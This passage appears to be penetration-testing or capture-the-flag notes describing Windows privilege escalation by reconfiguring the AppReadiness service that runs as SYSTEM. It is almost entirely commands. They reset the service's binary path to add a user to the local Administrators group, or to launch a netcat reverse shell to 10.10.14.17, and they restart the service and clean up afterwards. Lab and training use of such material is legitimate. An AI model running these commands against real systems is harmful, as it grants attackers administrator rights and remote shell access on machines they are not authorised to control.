## Exploit
Choose a service that run as `SYSTEM`, like `AppReadiness`. We can query service info like this.

```cmd
sc qc AppReadiness
```

Remember to note down the `BINARY_PATH_NAME`, we will modify it, so when cleaning up we need to reverse the process

### Check permission

Download [PsService](https://learn.microsoft.com/en-us/sysinternals/downloads/psservice) and transfer to target machine. This binary is from sysinternal suite

```sh
wget https://download.sysinternals.com/files/PSTools.zip
unzip PSTools.zip
```

Then we can check our permission over this service. All is good

```cmd
.\PsService.exe security AppReadiness
```

### Modify service

Here we add user `server_adm` to local admin group

```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Or we can execute a reverse shell, whatever you wanna execute

```cmd
sc.exe config AppReadiness binPath="C:\programdata\nc.exe -e cmd.exe 10.10.14.17 9090"
```

Start service

```cmd
sc.exe stop AppReadiness
sc.exe start AppReadiness
```

### Clean up

```cmd
sc config AppReadiness binPath= "<original BINARY_PATH_NAME>"
sc.exe stop AppReadiness
sc.exe start AppReadiness
```